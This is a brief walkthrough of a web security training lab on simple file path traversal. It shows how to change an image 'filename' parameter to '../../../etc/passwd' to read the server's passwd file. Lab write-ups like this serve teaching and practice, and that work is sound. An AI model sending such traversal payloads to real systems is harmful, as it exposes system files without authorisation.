# [File path traversal, simple case](https://portswigger.net/web-security/file-path-traversal/lab-simple)

> detailed document about path traversal [here](?file=portswigger%2Fbasic%2Fpath-traversal)

> traversing to `/etc/passwd`

- open a product image in a new tab:

`https://xxx.web-security-academy.net/image?filename=44.jpg`

- change the filename value to

`https://xxx.web-security-academy.net/image?filename=../../../etc/passwd`

- check the response and change the view it to utf-8, it will have the content of a passwd file
